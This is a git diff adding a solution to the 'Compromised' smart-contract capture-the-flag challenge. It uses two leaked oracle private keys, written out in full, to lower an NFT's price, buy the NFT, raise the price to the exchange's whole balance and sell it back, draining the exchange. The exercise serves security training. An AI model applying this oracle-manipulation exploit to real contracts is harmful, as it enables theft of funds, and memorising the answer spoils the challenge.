@@ -48,6 +48,26 @@ describe('Compromised challenge', function () {
 
     it('Exploit', async function () {
         /** YOUR EXPLOIT GOES HERE */
+        // Get oracle accounts from compromised keys
+        const compromisedAccount1 = web3.eth.accounts.privateKeyToAccount("0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9");
+        const compromisedAccount2 = web3.eth.accounts.privateKeyToAccount("0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48");
+
+        // Reduce NFT price
+        await this.oracle.postPrice("DVNFT", ether("1"), { from: compromisedAccount1 });
+        await this.oracle.postPrice("DVNFT", ether("1"), { from: compromisedAccount2 });
+
+        // Buy an NFT
+        await this.exchange.buyOne({ from: attacker, value: ether("1")});
+
+        // Rise NFT price
+        const exchangeBalance = await balance.current(this.exchange.address);
+        await this.oracle.postPrice("DVNFT", exchangeBalance, { from: compromisedAccount1 });
+        await this.oracle.postPrice("DVNFT", exchangeBalance, { from: compromisedAccount2 });
+
+        // Sell NFT and drain exchange funds
+        const tokenId = 1;
+        await this.token.approve(this.exchange.address, tokenId, { from: attacker });
+        await this.exchange.sellOne(tokenId, { from: attacker });
     });
 
     after(async function () {
